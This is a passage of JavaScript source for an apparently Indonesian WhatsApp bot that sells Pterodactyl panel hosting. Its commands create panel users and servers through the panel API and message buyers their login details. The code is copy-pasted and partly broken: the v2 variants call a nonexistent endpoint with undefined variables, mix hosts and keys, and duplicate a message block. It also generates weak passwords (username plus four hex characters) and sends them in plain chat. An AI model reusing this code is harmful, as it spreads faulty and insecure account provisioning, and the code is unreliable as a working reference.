* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await client.sendMessage(orang, {text: teks}, {quoted: loli})
delete global.panel
}
break

case "1gb2": case "2gb2": case "3gb2": case "4gb2": case "5gb2": case "6gb2": case "7gb2": case "8gb2": case "9gb2": case "10gb2": case "unlimited2": case "unli2": {
if (!isCreator && !isSellerr) return reply(mess.seller2)
if (global.panel == undefined) return reply('Username tidak ditemukan!')
var ram
var disknya
var cpu

if (command == "1gb2") {
    ram = "1000";
    disknya = "1000";
    cpu = "40";
} else if (command == "2gb2") {
    ram = "2000";
    disknya = "1000";
    cpu = "60";
} else if (command == "3gb2") {
    ram = "3000";
    disknya = "2000";
    cpu = "80";
} else if (command == "4gb2") {
    ram = "4000";
    disknya = "2000";
    cpu = "100";
} else if (command == "5gb2") {
    ram = "5000";
    disknya = "3000";
    cpu = "120";
} else if (command == "6gb2") {
    ram = "6000";
    disknya = "3000";
    cpu = "140";
} else if (command == "7gb2") {
    ram = "7000";
    disknya = "4000";
    cpu = "160";
} else if (command == "8gb2") {
    ram = "8000";
    disknya = "4000";
    cpu = "180";
} else if (command == "9gb2") {
    ram = "9000";
    disknya = "5000";
    cpu = "200";
} else if (command == "10gb2") {
    ram = "10000";
    disknya = "5000";
    cpu = "220";
} else {
    ram = "0";
    disknya = "0";
    cpu = "0";
}

let username = global.panel[0].toLowerCase()
let email = username + "@gmail.com";
let name = capital(username) + " Server";
let password = username + crypto.randomBytes(2).toString('hex');

// Sisa kode tetap sama seperti semula...
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await reply("*Succesfully Created Akun Panel*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `*Data Akun Panel Anda*

*Succesfully Create Akun Panel Server 2*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domainV2}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await client.sendMessage(orang, {text: teks}, {quoted: loli})
delete global.panel
}
break

case "c1gb": {
    if (!isCreator && !isSeller) return reply(mess.seller)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await client.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
let memo = "1024"
let cpu = "40"
let disk = "1024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/349/551214073_client.jpg" 
if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`*Succesfully Created Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succesfully Create Akun Panel*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domain}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
client.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: loli })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c1gb-v2": {
if (!isCreator && !isSellerr) return reply(mess.seller2)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await client.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "1024"
let cpu = "40"
let disk = "1024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/349/551214073_client.jpg" 
if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succes Create Akun Panel Server 2*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domainV2}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
client.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: loli })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c2gb": {
    if (!isCreator && !isSeller) return reply(mess.seller)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await client.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
let memo = "2024"
let cpu = "60"
let disk = "2024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/349/551214073_client.jpg" 
if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succesfully Create Akun Panel*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domain}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
client.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: loli })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c2gb-v2": {
if (!isCreator && !isSellerr) return reply(mess.seller2)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await client.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "2024"
let cpu = "60"
let disk = "2024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/349/551214073_client.jpg" 
if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succes Create Akun Panel Server 2*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domainV2}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
client.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: loli })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c3gb": {
       
    if (!isCreator && !isSeller) return reply(mess.seller)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await client.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
let memo = "3024"
let cpu = "80"
let disk = "3024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/349/551214073_client.jpg" 
if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succesfully Create Akun Panel*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domain}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
client.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: loli })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c3gb-v2": {
if (!isCreator && !isSellerr) return reply(mess.seller2)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await client.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "3024"
let cpu = "80"
let disk = "3024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/349/551214073_client.jpg"
if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succes Create Akun Panel Server 2*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domainV2}*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domainV2}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
client.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: loli })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c4gb": {
       
    if (!isCreator && !isSeller) return reply(mess.seller)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await client.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
let memo = "4024"
let cpu = "100"
let disk = "4024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/349/551214073_client.jpg" 
if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succesfully Create Akun Panel*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domain}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
client.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: loli })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c4gb-v2": {
if (!isCreator && !isSellerr) return reply(mess.seller2)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await client.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "4024"
let cpu = "100"
let disk = "4024"
let email = username + "1398@gmail.com"
akunlo = fs.readFileSync("./source/media/Xyz.jpg");
if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succes Create Akun Panel Server 2*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domainV2}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
client.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: loli })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c5gb": {
       
    if (!isCreator && !isSeller) return reply(mess.seller)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await client.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
